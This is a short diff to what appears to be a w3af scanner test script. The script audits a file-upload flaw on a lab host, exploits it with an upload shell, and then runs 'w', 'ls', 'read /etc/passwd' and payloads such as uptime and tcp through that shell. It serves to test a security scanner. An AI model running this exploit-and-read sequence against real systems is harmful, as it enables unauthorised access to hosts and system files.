@@ -14,7 +14,7 @@ audit fileUpload
 back
 
 target
-set target http://localhost/w3af/audit/file_upload/
+set target http://moth/w3af/audit/file_upload/
 back
 
 start
@@ -24,9 +24,15 @@ assert len( kb.kb.getData('fileUpload', 'fileUpload') ) == 1
 exploit
 exploit fileUploadShell
 interact 0
-w
-ls
-endInteraction
+
+execute w
+execute ls
+read /etc/passwd
+payload uptime
+payload users
+payload tcp
+
+exit
 
 back
 
